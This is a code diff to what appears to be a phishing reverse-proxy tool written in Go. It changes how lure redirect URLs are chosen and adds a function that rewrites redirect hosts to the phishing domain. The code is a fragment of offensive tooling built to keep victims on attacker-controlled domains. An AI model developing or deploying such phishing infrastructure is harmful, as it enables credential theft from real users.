@@ -203,7 +203,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 							d_json, err := json.Marshal(&ResponseRedirectUrl{RedirectUrl: redirect_url})
 							if err == nil {
-								log.Important("[%d] dynamic redirect to URL: %s", ps.Index, redirect_url)
+								s_index, _ := p.sids[session_id]
+								log.Important("[%d] dynamic redirect to URL: %s", s_index, redirect_url)
 								resp := goproxy.NewResponse(req, "application/json", 200, string(d_json))
 								return req, resp
 							}
@@ -312,9 +313,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 
 									if l != nil {
-										session.RedirectURL = l.RedirectUrl
+										session.RedirectURL = pl.RedirectUrl
+										if l.RedirectUrl != "" {
+											session.RedirectURL = l.RedirectUrl
+										}
+										if session.RedirectURL != "" {
+											session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
+										}
 										session.PhishLure = l
-										log.Debug("redirect URL (lure): %s", l.RedirectUrl)
+										log.Debug("redirect URL (lure): %s", session.RedirectURL)
 									}
 
 									// set params from url arguments
@@ -1546,6 +1553,17 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 		}
 	}
 	return hostname, false
+}
+
+func (p *HttpProxy) replaceUrlWithPhished(u string) (string, bool) {
+	r_url, err := url.Parse(u)
+	if err == nil {
+		if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
+			r_url.Host = r_host
+			return r_url.String(), true
+		}
+	}
+	return u, false
 }
 
 func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
